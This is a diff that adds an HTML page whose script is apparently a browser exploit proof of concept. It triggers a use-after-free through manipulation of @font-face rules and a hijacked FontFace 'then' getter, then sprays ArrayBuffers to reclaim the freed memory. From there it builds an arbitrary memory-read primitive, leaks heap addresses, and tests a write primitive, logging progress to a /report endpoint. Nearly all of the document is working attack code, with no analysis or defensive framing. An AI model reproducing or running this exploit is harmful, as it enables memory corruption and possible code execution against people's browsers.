@@ -1,0 +1,61 @@
+<!doctype html><html><body style="margin:0;padding:10px;font-family:system-ui;background:#07090d;color:#cfe3ff">
+<button id="go" style="font-size:20px;padding:10px 22px;border-radius:10px">PROMOTE</button>
+<pre id="o" style="font:12px/1.4 ui-monospace;white-space:pre-wrap;margin-top:8px"></pre>
+<script>
+var L=[],o=document.getElementById("o");
+function lg(s){o.textContent+=s+"\n";L.push(s);try{fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:L})}).catch(function(){})}catch(e){}}
+function hx(a,b){return "0x"+("00000000"+(b>>>0).toString(16)).slice(-8)+("00000000"+(a>>>0).toString(16)).slice(-8)}
+var S=0xb8,F=0x28,FZ=0x30,FC=0x34,ST=0x7a;
+async function uaf(){
+ var n=0xb0,ab=[],ft=null,fa=null,st=document.createElement("style");
+ var r1="@font-face{font-family:s;src:local(systemfont);unicode-range:U+0043}";
+ var r2="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042}";
+ var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+ document.fonts.add(A);void A.loaded;document.head.append(st);
+ for(var i=0;i<n/4;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ var u=st.sheet.cssRules.length;st.sheet.insertRule(r2,st.sheet.cssRules.length);
+ for(var i=n/4;i<n;i++)st.sheet.insertRule(r1,st.sheet.cssRules.length);
+ void document.body.offsetHeight;
+ var ot=FontFace.prototype.then;
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+  if(this!==A)return;st.sheet.deleteRule(u);void document.body.offsetHeight;
+  for(var i=st.sheet.cssRules.length-1;i>=0;i--){if(st.sheet.cssRules[i].cssText.indexOf("s;")>=0)st.sheet.deleteRule(i)}
+  void document.body.offsetHeight;
+  for(var i=0;i<n;i++){var b=new ArrayBuffer(S),d=new DataView(b);d.setUint32(0x58,0,true);d.setUint32(0x5c,0,true);d.setUint32(8,1,true);d.setUint8(ST,3);ab.push(b)}
+  return undefined}});
+ var fs=null;try{fs=await document.fonts.load("1em a,b","AB")}catch(e){}
+ Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:ot});
+ if(!fs||fs.length!==2)return null;
+ for(var i=0;i<fs.length;i++)if(fs[i].unicodeRange==="U+0-10FFFF")ft=fs[i];
+ for(var i=0;i<ab.length;i++)if(new DataView(ab[i]).getUint32(8,true)===2)fa=ab[i];
+ if(!ft||!fa)return null;
+ var d=new DataView(fa);
+ function sp(o2,a,b){d.setUint32(o2,a>>>0,true);d.setUint32(o2+4,b>>>0,true)}
+ function rd(a,b,sz){var r=new ArrayBuffer(sz),v=new Uint8Array(r),i=0;while(i<sz){sp(F,(a+i)>>>0,b);d.setInt32(FZ,1,true);d.setInt32(FC,1,true);var s=ft.featureSettings;for(var j=1;j<5&&i<sz;j++)v[i++]=s.charCodeAt(j)&255}return r}
+ return {f:ft,rd:rd,ab:fa,dv:d};
+}
+async function run(){
+ lg("PROMOTE "+navigator.userAgent);
+ var u=await uaf();if(!u){lg("no primitive");return}
+ var d=u.dv;
+ var ww=u.rd(d.getUint32(0x60,true),d.getUint32(0x64,true),0x80);
+ var wv=new DataView(ww.buffer||new Uint8Array(ww).buffer);
+ var Fp={lo:wv.getUint32(8,true),hi:wv.getUint32(12,true)};
+ var fw=u.rd(Fp.lo,Fp.hi,0x80); var fv=new DataView(fw.buffer||new Uint8Array(fw).buffer);
+ var Bp={lo:fv.getUint32(0x30,true),hi:fv.getUint32(0x34,true)};
+ lg("[anchor] B="+hx(Bp.lo,Bp.hi));
+ // mechanism self-test: set m_clients = B+0x40 so a rehash writes the count at B+0x30
+ d.setUint32(0x58,(Bp.lo+0x40)>>>0,true);
+ d.setUint32(0x5c,Bp.hi,true);
+ lg("[setup] m_clients=B+0x40 (rehash target B+0x30)");
+ // trigger a client change: re-associate the font with a new family (adds a client)
+ try{ u.f.family="promote-"+Date.now(); }catch(e){ lg("[trig] family threw: "+e.message); }
+ void document.body.offsetHeight;
+ // read back B+0x30 (the count should be a small integer)
+ var bw=u.rd(Bp.lo,Bp.hi,0x80); var bv=new DataView(bw.buffer||new Uint8Array(bw).buffer);
+ var v30=bv.getUint32(0x30,true),v34=bv.getUint32(0x34,true);
+ lg("[m_clients] B+0x30="+hx(v30,v34)+" (before was 0)");
+ lg("done");
+}
+document.getElementById("go").addEventListener("click",run);
+</script></body></html>
